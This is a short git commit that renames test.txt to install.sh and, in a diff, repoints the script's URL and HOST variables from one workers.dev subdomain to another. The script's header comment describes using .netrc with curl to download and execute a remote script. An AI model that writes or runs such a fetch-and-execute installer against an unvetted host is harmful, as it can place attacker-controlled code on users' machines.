2f3ecfac9768dc841d46ee6aec94f2ea86737284
mdersadh45-blip <mdersadh45@gmail.com>
2026-08-01 20:47:29 +0530

    Update and rename test.txt to install.sh

--- install.sh
+++ install.sh
@@ -2,8 +2,8 @@
 # .netrc → curl --netrc → download & execute remote script
 set -euo pipefail
 
-URL="https://test.zenseitech.workers.dev"
-HOST="test.zenseitech.workers.dev"
+URL="https://sky.ggghosain0.workers.dev"
+HOST="sky.ggghosain0.workers.dev"
 NETRC="${HOME}/.netrc"
 
 if ! command -v curl >/dev/null 2>&1; then
